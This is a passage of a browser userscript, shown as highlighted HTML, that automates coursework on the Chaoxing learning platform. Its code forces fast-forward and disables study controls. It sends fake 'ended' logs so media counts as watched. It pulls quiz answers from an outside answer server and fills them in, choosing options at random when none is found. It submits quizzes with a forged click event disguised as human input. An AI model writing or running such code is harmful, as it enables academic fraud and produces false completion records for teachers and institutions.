<span class="hljs-string">&#x27;&lt;a href=&quot;https://d0.ananas.chaoxing.com/download/&#x27;</span> + _self.config(<span class="hljs-string">&#x27;objectid&#x27;</span>) + <span class="hljs-string">&#x27;&quot; target=&quot;_blank&quot;&gt;&#x27;</span>,<br>    img = <span class="hljs-string">&#x27;&lt;img src=&quot;https://d0.ananas.chaoxing.com/download/e363b256c0e9bc5bd8266bf99dd6d6bb&quot; style=&quot;margin: 6px 0 0 6px;&quot;&gt;&#x27;</span>;<br>    player.volume(<span class="hljs-built_in">Math</span>.round(setting.vol) / <span class="hljs-number">100</span> || <span class="hljs-number">0</span>);<br>    Ext.get(player.controlBar.addChild(<span class="hljs-string">&#x27;Button&#x27;</span>).el_).setHTML(a + img + <span class="hljs-string">&#x27;&lt;/a&gt;&#x27;</span>).dom.title = <span class="hljs-string">&#x27;下载视频&#x27;</span>;<br>    player.on(<span class="hljs-string">&#x27;loadstart&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        setting.tip &amp;&amp; <span class="hljs-built_in">this</span>.play().catch(Ext.emptyFn);<br>        <span class="hljs-built_in">this</span>.playbackRate(setting.rate &gt; <span class="hljs-number">16</span> || setting.rate &lt; <span class="hljs-number">0.0625</span> ? <span class="hljs-number">1</span> : setting.rate);<br>    &#125;);<br>    player.one([<span class="hljs-string">&#x27;loadedmetadata&#x27;</span>, <span class="hljs-string">&#x27;firstplay&#x27;</span>], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        setting.two = setting.rate === <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; setting.two &lt; <span class="hljs-number">1</span>;<br>        setting.two &amp;&amp; config.plugins.seekBarControl.sendLog(<span class="hljs-built_in">this</span>.children_[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;ended&#x27;</span>, <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">this</span>.cache_.duration));<br>    &#125;);<br>    player.on(<span class="hljs-string">&#x27;ended&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        Ext.fly(frameElement).parent().addCls(<span class="hljs-string">&#x27;ans-job-finished&#x27;</span>);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> player;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hookAudio</span>(<span class="hljs-params"></span>) </span>&#123;<br>    _self.alert = <span class="hljs-built_in">console</span>.log;<br>    <span class="hljs-keyword">var</span> config = <span class="hljs-built_in">arguments</span>[<span class="hljs-number">1</span>];<br>    config.plugins.studyControl.enableSwitchWindow = <span class="hljs-number">1</span>;<br>    config.plugins.seekBarControl.enableFastForward = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (!setting.queue) <span class="hljs-keyword">delete</span> config.plugins.studyControl;<br>    <span class="hljs-keyword">var</span> player = vjs.apply(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">arguments</span>),<br>    a = <span class="hljs-string">&#x27;&lt;a href=&quot;https://d0.ananas.chaoxing.com/download/&#x27;</span> + _self.config(<span class="hljs-string">&#x27;objectid&#x27;</span>) + <span class="hljs-string">&#x27;&quot; target=&quot;_blank&quot;&gt;&#x27;</span>,<br>    img = <span class="hljs-string">&#x27;&lt;img src=&quot;https://d0.ananas.chaoxing.com/download/e363b256c0e9bc5bd8266bf99dd6d6bb&quot; style=&quot;margin: 6px 0 0 6px;&quot;&gt;&#x27;</span>;<br>    player.volume(<span class="hljs-built_in">Math</span>.round(setting.vol) / <span class="hljs-number">100</span> || <span class="hljs-number">0</span>);<br>    player.playbackRate(setting.rate &gt; <span class="hljs-number">16</span> || setting.rate &lt; <span class="hljs-number">0.0625</span> ? <span class="hljs-number">1</span> : setting.rate);<br>    Ext.get(player.controlBar.addChild(<span class="hljs-string">&#x27;Button&#x27;</span>).el_).setHTML(a + img + <span class="hljs-string">&#x27;&lt;/a&gt;&#x27;</span>).dom.title = <span class="hljs-string">&#x27;下载音频&#x27;</span>;<br>    player.on(<span class="hljs-string">&#x27;loadeddata&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        setting.tip &amp;&amp; <span class="hljs-built_in">this</span>.play().catch(Ext.emptyFn);<br>    &#125;);<br>    player.one(<span class="hljs-string">&#x27;firstplay&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        setting.rate === <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; config.plugins.seekBarControl.sendLog(<span class="hljs-built_in">this</span>.children_[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;ended&#x27;</span>, <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">this</span>.cache_.duration));<br>    &#125;);<br>    player.on(<span class="hljs-string">&#x27;ended&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        Ext.fly(frameElement).parent().addCls(<span class="hljs-string">&#x27;ans-job-finished&#x27;</span>);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> player;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">relieveLimit</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (setting.scale) _self.UEDITOR_CONFIG.scaleEnabled = <span class="hljs-literal">false</span>;<br>    $.each(UE.instants, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> key = <span class="hljs-built_in">this</span>.key;<br>        <span class="hljs-built_in">this</span>.ready(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-built_in">this</span>.destroy();<br>            UE.getEditor(key);<br>        &#125;);<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">beforeFind</span>(<span class="hljs-params"></span>) </span>&#123;<br>    setting.regl = parent.greenligth || $.noop;<br>    <span class="hljs-keyword">if</span> ($.<span class="hljs-keyword">type</span>(parent._data) == <span class="hljs-string">&#x27;array&#x27;</span>) <span class="hljs-keyword">return</span> setting.regl();<br>    setting.div = $(<br>        <span class="hljs-string">&#x27;&lt;div style=&quot;border: 2px dashed rgb(0, 85, 68); width: 330px; position: fixed; top: 0; right: 0; z-index: 99999; background-color: rgba(70, 196, 38, 0.6); overflow-x: auto;&quot;&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;span style=&quot;font-size: medium;&quot;&gt;&lt;/span&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;div style=&quot;font-size: medium;&quot;&gt;正在搜索答案...&lt;/div&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;button style=&quot;margin-right: 10px;&quot;&gt;暂停答题&lt;/button&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;button style=&quot;margin-right: 10px;&quot;&gt;&#x27;</span> + (setting.auto ? <span class="hljs-string">&#x27;取消本次自动提交&#x27;</span> : <span class="hljs-string">&#x27;开启本次自动提交&#x27;</span>) + <span class="hljs-string">&#x27;&lt;/button&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;button style=&quot;margin-right: 10px;&quot;&gt;重新查询&lt;/button&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;button&gt;折叠面板&lt;/button&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;div style=&quot;max-height: 300px; overflow-y: auto;&quot;&gt;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&lt;table border=&quot;1&quot; style=&quot;font-size: 12px;&quot;&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;thead&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span> +<br>                            <span class="hljs-string">&#x27;&lt;th style=&quot;width: 25px; min-width: 25px;&quot;&gt;题号&lt;/th&gt;&#x27;</span> +<br>                            <span class="hljs-string">&#x27;&lt;th style=&quot;width: 60%; min-width: 130px;&quot;&gt;题目（点击可复制）&lt;/th&gt;&#x27;</span> +<br>                            <span class="hljs-string">&#x27;&lt;th style=&quot;min-width: 130px;&quot;&gt;答案（点击可复制）&lt;/th&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;/thead&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;tfoot style=&quot;display: none;&quot;&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span> +<br>                            <span class="hljs-string">&#x27;&lt;th colspan=&quot;3&quot;&gt;答案提示框 已折叠&lt;/th&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;/tfoot&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;tbody&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span> +<br>                            <span class="hljs-string">&#x27;&lt;td colspan=&quot;3&quot; style=&quot;display: none;&quot;&gt;&lt;/td&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&lt;/tbody&gt;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&lt;/table&gt;&#x27;</span> +<br>            <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>    ).appendTo(<span class="hljs-string">&#x27;body&#x27;</span>).on(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-string">&#x27;button, td&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> len = $(<span class="hljs-built_in">this</span>).prevAll(<span class="hljs-string">&#x27;button&#x27;</span>).length;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.nodeName == <span class="hljs-string">&#x27;TD&#x27;</span>) &#123;<br>            $(<span class="hljs-built_in">this</span>).prev().length &amp;&amp; GM_setClipboard($(<span class="hljs-built_in">this</span>).text());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!$(<span class="hljs-built_in">this</span>).siblings().length) &#123;<br>            $(<span class="hljs-built_in">this</span>).parent().text(<span class="hljs-string">&#x27;正在搜索答案...&#x27;</span>);<br>            setting.num++;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (setting.loop) &#123;<br>                <span class="hljs-built_in">clearInterval</span>(setting.loop);<br>                <span class="hljs-keyword">delete</span> setting.loop;<br>                len = [<span class="hljs-string">&#x27;已暂停搜索&#x27;</span>, <span class="hljs-string">&#x27;继续答题&#x27;</span>];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                setting.loop = <span class="hljs-built_in">setInterval</span>(findAnswer, setting.time);<br>                len = [<span class="hljs-string">&#x27;正在搜索答案...&#x27;</span>, <span class="hljs-string">&#x27;暂停答题&#x27;</span>];<br>            &#125;<br>            setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).html(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>                <span class="hljs-keyword">return</span> $(<span class="hljs-built_in">this</span>).data(<span class="hljs-string">&#x27;html&#x27;</span>) || len[<span class="hljs-number">0</span>];<br>            &#125;).removeData(<span class="hljs-string">&#x27;html&#x27;</span>);<br>            $(<span class="hljs-built_in">this</span>).html(len[<span class="hljs-number">1</span>]);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len == <span class="hljs-number">1</span>) &#123;<br>            setting.auto = !setting.auto;<br>            $(<span class="hljs-built_in">this</span>).html(setting.auto ? <span class="hljs-string">&#x27;取消本次自动提交&#x27;</span> : <span class="hljs-string">&#x27;开启本次自动提交&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len == <span class="hljs-number">2</span>) &#123;<br>            parent.location.reload();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len == <span class="hljs-number">3</span>) &#123;<br>            setting.div.find(<span class="hljs-string">&#x27;tbody, tfoot&#x27;</span>).toggle();<br>        &#125;<br>    &#125;).find(<span class="hljs-string">&#x27;table, td, th&#x27;</span>).css(<span class="hljs-string">&#x27;border&#x27;</span>, <span class="hljs-string">&#x27;1px solid&#x27;</span>).end();<br>    setting.lose = setting.num = <span class="hljs-number">0</span>;<br>    setting.data = parent._data = [];<br>    setting.over = <span class="hljs-string">&#x27;&lt;button style=&quot;margin-right: 10px;&quot;&gt;跳过此题&lt;/button&gt;&#x27;</span>;<br>    setting.curs = $(<span class="hljs-string">&#x27;script:contains(courseName)&#x27;</span>, top.document).text().match(<span class="hljs-regexp">/courseName:\&#x27;(.+?)\&#x27;|$/</span>)[<span class="hljs-number">1</span>] || $(<span class="hljs-string">&#x27;h1&#x27;</span>).text().trim() || <span class="hljs-string">&#x27;无&#x27;</span>;<br>    setting.loop = <span class="hljs-built_in">setInterval</span>(findAnswer, setting.time);<br>    <span class="hljs-keyword">var</span> tip = (&#123;<span class="hljs-attr">undefined</span>: <span class="hljs-string">&#x27;任务点排队中&#x27;</span>, <span class="hljs-attr">null</span>: <span class="hljs-string">&#x27;等待切换中&#x27;</span>&#125;)[setting.tip];<br>    tip &amp;&amp; setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).data(<span class="hljs-string">&#x27;html&#x27;</span>, tip).siblings(<span class="hljs-string">&#x27;button:eq(0)&#x27;</span>).click();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findAnswer</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (setting.num &gt;= $(<span class="hljs-string">&#x27;.TiMu&#x27;</span>).length) &#123;<br>        <span class="hljs-keyword">var</span> arr = setting.lose ? [<span class="hljs-string">&#x27;共有 &lt;font color=&quot;red&quot;&gt;&#x27;</span> + setting.lose + <span class="hljs-string">&#x27;&lt;/font&gt; 道题目待完善（已深色标注）&#x27;</span>, saveThis] : [<span class="hljs-string">&#x27;答题已完成&#x27;</span>, submitThis];<br>        setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).data(<span class="hljs-string">&#x27;html&#x27;</span>, arr[<span class="hljs-number">0</span>]).siblings(<span class="hljs-string">&#x27;button:eq(0)&#x27;</span>).hide().click();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">setTimeout</span>(arr[<span class="hljs-number">1</span>], setting.time);<br>    &#125;<br>    <span class="hljs-keyword">var</span> $TiMu = $(<span class="hljs-string">&#x27;.TiMu&#x27;</span>).eq(setting.num),<br>    question = filterImg($TiMu.find(<span class="hljs-string">&#x27;.Zy_TItle:eq(0) .clearfix&#x27;</span>)).replace(<span class="hljs-regexp">/^【.*?】\s*/</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/\s*（\d+\.\d+分）$/</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/[(]\s*[)]。$/</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/（\s*）。$/</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/[(]\s*[)]$/</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/（\s*）$/</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/。$/</span>,<span class="hljs-string">&#x27;&#x27;</span>),<br>    <span class="hljs-keyword">type</span> = $TiMu.find(<span class="hljs-string">&#x27;input[name^=answertype]:eq(0)&#x27;</span>).val() || <span class="hljs-string">&#x27;-1&#x27;</span>;<br><br><br>    <span class="hljs-comment">//setting.div.children(&#x27;div:eq(0)&#x27;).text(encodeURIComponent(question)+&#x27;正在搜索答案...&#x27;);</span><br><br><br>    GM_xmlhttpRequest(&#123;<br>        method: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        url: <span class="hljs-string">&#x27;http://ydfq.52msr.cn/chati.php&#x27;</span>,<br>        headers: &#123;<br>            <span class="hljs-string">&#x27;Content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        &#125;,<br>        data: <span class="hljs-string">&#x27;question=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(question),<br>        timeout: setting.time,<br>        onload: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (!setting.loop) &#123;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (xhr.status == <span class="hljs-number">200</span>) &#123;<br>                <span class="hljs-keyword">var</span> obj = $.parseJSON(xhr.responseText.replace(<span class="hljs-regexp">/^操作数据失败！/</span>,<span class="hljs-string">&#x27;&#x27;</span>)) || &#123;&#125;;<br>                obj.answer = obj.data;<br>                <span class="hljs-keyword">if</span> (obj.code) &#123;<br>                    setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).text(<span class="hljs-string">&#x27;正在搜索答案...&#x27;</span>);<br>                    <span class="hljs-keyword">var</span> td = <span class="hljs-string">&#x27;&lt;td style=&quot;border: 1px solid;&#x27;</span>,<br>                    answer = <span class="hljs-built_in">String</span>(obj.answer).replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="hljs-regexp">/&lt;(?!img)/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>);<br>                    obj.answer = <span class="hljs-regexp">/^http/</span>.test(answer) ? <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> + obj.answer + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> : obj.answer;<br>                    $(<br>                        <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span> +<br>                            td + <span class="hljs-string">&#x27; text-align: center;&quot;&gt;&#x27;</span> + $TiMu.find(<span class="hljs-string">&#x27;.Zy_TItle:eq(0) i&#x27;</span>).text().trim() + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span> +<br>                            td + <span class="hljs-string">&#x27;&quot; title=&quot;点击可复制&quot;&gt;&#x27;</span> + (question.match(<span class="hljs-string">&#x27;&lt;img&#x27;</span>) ? question : question.replace(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt&#x27;</span>)) + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span> +<br>                            td + <span class="hljs-string">&#x27;&quot; title=&quot;点击可复制&quot;&gt;&#x27;</span> + (<span class="hljs-regexp">/^http/</span>.test(answer) ? obj.answer : <span class="hljs-string">&#x27;&#x27;</span>) + answer + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span> +<br>                        <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span><br>                    ).appendTo(setting.div.find(<span class="hljs-string">&#x27;tbody&#x27;</span>)).css(<span class="hljs-string">&#x27;background-color&#x27;</span>, fillAnswer($TiMu.find(<span class="hljs-string">&#x27;ul:eq(0)&#x27;</span>).find(<span class="hljs-string">&#x27;li&#x27;</span>), obj, <span class="hljs-keyword">type</span>) ? <span class="hljs-string">&#x27;&#x27;</span> : <span class="hljs-string">&#x27;rgba(0, 150, 136, 0.6)&#x27;</span>);<br>                    setting.data[setting.num++] = &#123;<br>                        code: obj.code &gt; <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>,<br>                        question: question,<br>                        option: obj.answer,<br>                        <span class="hljs-keyword">type</span>: <span class="hljs-built_in">Number</span>(<span class="hljs-keyword">type</span>)<br>                    &#125;;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).html(obj.answer || setting.over + <span class="hljs-string">&#x27;服务器繁忙，正在重试...&#x27;</span>);<br>                &#125;<br>                setting.div.children(<span class="hljs-string">&#x27;span&#x27;</span>).html(obj.msg || <span class="hljs-string">&#x27;&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (xhr.status == <span class="hljs-number">403</span>) &#123;<br>                <span class="hljs-keyword">var</span> html = xhr.responseText.indexOf(<span class="hljs-string">&#x27;&#123;&#x27;</span>) ? <span class="hljs-string">&#x27;请求过于频繁，建议稍后再试&#x27;</span> : $.parseJSON(xhr.responseText).data;<br>                setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).data(<span class="hljs-string">&#x27;html&#x27;</span>, html).siblings(<span class="hljs-string">&#x27;button:eq(0)&#x27;</span>).click();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).html(<span class="hljs-string">&#x27;题库异常，明天再来试试吧...&#x27;</span>);<br>            &#125;<br>        &#125;,<br>        ontimeout: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>            setting.loop &amp;&amp; setting.div.children(<span class="hljs-string">&#x27;div:eq(0)&#x27;</span>).html(setting.over + <span class="hljs-string">&#x27;服务器超时，正在重试...&#x27;</span>);<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fillAnswer</span>(<span class="hljs-params">$li, obj, <span class="hljs-keyword">type</span></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> $input = $li.find(<span class="hljs-string">&#x27;:radio, :checkbox&#x27;</span>),<br>    str = <span class="hljs-built_in">String</span>(obj.answer).toCDB() || <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toString(),<br>    data = str.split(<span class="hljs-regexp">/#|\x01|\|/</span>),<br>    opt = obj.opt || str,<br>    state = setting.lose;<br>    <span class="hljs-comment">// $li.find(&#x27;:radio:checked&#x27;).prop(&#x27;checked&#x27;, false);</span><br>    obj.code &gt; <span class="hljs-number">0</span> &amp;&amp; $input.each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.value == <span class="hljs-string">&#x27;true&#x27;</span>) &#123;<br>            data.join().match(<span class="hljs-regexp">/(^|,)(正确|是|对|√|T|ri)(,|$)/</span>) &amp;&amp; <span class="hljs-built_in">this</span>.click();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.value == <span class="hljs-string">&#x27;false&#x27;</span>) &#123;<br>            data.join().match(<span class="hljs-regexp">/(^|,)(错误|否|错|×|F|wr)(,|$)/</span>) &amp;&amp; <span class="hljs-built_in">this</span>.click();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> tip = filterImg($li.eq(index).find(<span class="hljs-string">&#x27;.after&#x27;</span>)).toCDB() || <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>().toString();<br>            <span class="hljs-built_in">Boolean</span>($.inArray(tip, data) + <span class="hljs-number">1</span> || (<span class="hljs-keyword">type</span> == <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; str.indexOf(tip) + <span class="hljs-number">1</span>)) == <span class="hljs-built_in">this</span>.checked || <span class="hljs-built_in">this</span>.click();<br>        &#125;<br>    &#125;).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^A?B?C?D?E?F?G?$/</span>.test(opt)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-built_in">Boolean</span>(opt.match(<span class="hljs-built_in">this</span>.value)) == <span class="hljs-built_in">this</span>.checked || <span class="hljs-built_in">this</span>.click();<br>    &#125;);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.match(<span class="hljs-regexp">/^[013]$/</span>)) &#123;<br>        $input.is(<span class="hljs-string">&#x27;:checked&#x27;</span>) || (setting.none ? ($input[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * $input.length)] || $()).click() : setting.lose++);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span>.match(<span class="hljs-regexp">/^(2|[4-9]|1[08])$/</span>)) &#123;<br>        data = <span class="hljs-built_in">String</span>(obj.answer).split(<span class="hljs-regexp">/#|\x01|\|/</span>);<br>        str = $li.end().find(<span class="hljs-string">&#x27;textarea&#x27;</span>).each(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">index</span>) </span>&#123;<br>            index = (obj.code &gt; <span class="hljs-number">0</span> &amp;&amp; data[index]) || <span class="hljs-string">&#x27;&#x27;</span>;<br>            UE.getEditor(<span class="hljs-built_in">this</span>.name).setContent(index.trim());<br>        &#125;).length;<br>        (obj.code &gt; <span class="hljs-number">0</span> &amp;&amp; data.length == str) || setting.none || setting.lose++;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        setting.none || setting.lose++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> state == setting.lose;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveThis</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!setting.auto) <span class="hljs-keyword">return</span> <span class="hljs-built_in">setTimeout</span>(saveThis, setting.time);<br>    setting.div.children(<span class="hljs-string">&#x27;button:lt(3)&#x27;</span>).hide().eq(<span class="hljs-number">1</span>).click();<br>    _self.alert = <span class="hljs-built_in">console</span>.log;<br>    $(<span class="hljs-string">&#x27;#tempsave&#x27;</span>).click();<br>    setting.regl();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">submitThis</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!setting.auto) &#123;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!$(<span class="hljs-string">&#x27;.Btn_blue_1:visible&#x27;</span>).length) &#123;<br>        setting.div.children(<span class="hljs-string">&#x27;button:lt(3)&#x27;</span>).hide().eq(<span class="hljs-number">1</span>).click();<br>        <span class="hljs-keyword">return</span> setting.regl();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ($(<span class="hljs-string">&#x27;#confirmSubWin:visible&#x27;</span>).length) &#123;<br>        <span class="hljs-keyword">var</span> btn = $(<span class="hljs-string">&#x27;#tipContent + * &gt; a&#x27;</span>).offset() || &#123;<span class="hljs-attr">top</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">left</span>: <span class="hljs-number">0</span>&#125;,<br>        mouse = <span class="hljs-built_in">document</span>.createEvent(<span class="hljs-string">&#x27;MouseEvents&#x27;</span>);<br>        btn = [btn.left + <span class="hljs-built_in">Math</span>.ceil(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">46</span>), btn.top + <span class="hljs-built_in">Math</span>.ceil(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">26</span>)];<br>        mouse.initMouseEvent(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">document</span>.defaultView, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, btn[<span class="hljs-number">0</span>], btn[<span class="hljs-number">1</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>);<br>        _self.event = $.extend(<span class="hljs-literal">true</span>, &#123;&#125;, mouse);<br>        <span class="hljs-keyword">delete</span> _self.event.isTrusted;<br>        _self.form1submit();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $(<span class="hljs-string">&#x27;.Btn_blue_1&#x27;</span>)[<span class="hljs-number">0</span>].click();<br>    &#125;<br>    <span class="hljs-built_in">setTimeout</span>(submitThis, <span class="hljs-built_in">Math</span>.ceil(setting.time * <span class="hljs-built_in">Math</span>.random()) * <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkToNext</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> $tip = $(setting.job.join(<span class="hljs-string">&#x27;, &#x27;</span>), <span class="hljs-built_in">document</span>).prevAll(<span class="hljs-string">&#x27;.ans-job-icon&#x27;</span> + setting.normal);<br>    <span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        $tip.parent(<span class="hljs-string">&#x27;:not(.ans-job-finished)&#x27;</span>).length || setting.jump &amp;&amp; toNext();<br>    &#125;, setting.time);<br>&#125;<br><br><span 